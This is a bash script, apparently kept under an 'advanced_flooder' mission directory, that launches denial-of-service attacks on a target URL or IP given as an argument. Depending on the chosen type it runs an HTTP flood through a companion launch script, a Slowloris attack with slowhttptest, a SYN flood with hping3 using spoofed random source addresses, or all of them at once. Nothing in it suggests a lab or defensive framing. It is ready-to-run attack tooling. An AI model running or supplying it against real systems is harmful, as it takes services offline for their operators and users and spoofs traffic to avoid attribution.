#!/bin/bash

# Configuration
MISSION_DIR="/root/gemini-bridge/missions/advanced_flooder"
LAUNCH_SCRIPT="$MISSION_DIR/launch.sh"
VENV_PATH="$MISSION_DIR/venv"

if [ -z "$1" ]; then
    echo "Usage: $0 <URL/IP> [DURATION] [TYPE]"
    echo "Types: http, slowloris, syn, all"
    exit 1
fi

TARGET=$1
DURATION=${2:-60}
TYPE=${3:-http}

case $TYPE in
    http)
        echo "[INFO] Starting HTTP Flood on $TARGET..."
        $LAUNCH_SCRIPT "$TARGET" $DURATION 1000
        ;;
    slowloris)
        echo "[INFO] Starting Slowloris attack on $TARGET..."
        # Slowloris using slowhttptest
        # -c: connections, -H: slowloris mode, -g: generate report, -o: output file, -r: connections per second, -t: timeout, -u: URL, -x: follow-up interval
        slowhttptest -c 1000 -H -g -o slowloris_results -r 200 -t GET -u "$TARGET" -x 10 -l $DURATION
        ;;
    syn)
        echo "[INFO] Starting SYN Flood on $TARGET..."
        # SYN Flood using hping3 (requires root, which we have)
        # -S: SYN, -p: port (80/443), --flood: as fast as possible, --rand-source: fake sources
        # We need to extract the domain/IP from the URL
        CLEAN_TARGET=$(echo $TARGET | sed -e 's|^[^/]*//||' -e 's|/.*$||')
        hping3 -S "$CLEAN_TARGET" -p 80 --flood --rand-source -d 120 --interval u100 &
        HPING_PID=$!
        sleep $DURATION
        kill $HPING_PID
        ;;
    all)
        echo "[INFO] Starting ALL attacks on $TARGET..."
        $LAUNCH_SCRIPT "$TARGET" $DURATION 500 &
        slowhttptest -c 500 -H -u "$TARGET" -l $DURATION &
        # (Be careful with hping3 --flood, it can saturate our own interface too)
        wait
        ;;
    *)
        echo "Unknown type: $TYPE"
        exit 1
        ;;
esac

echo "[INFO] Master attack finished."
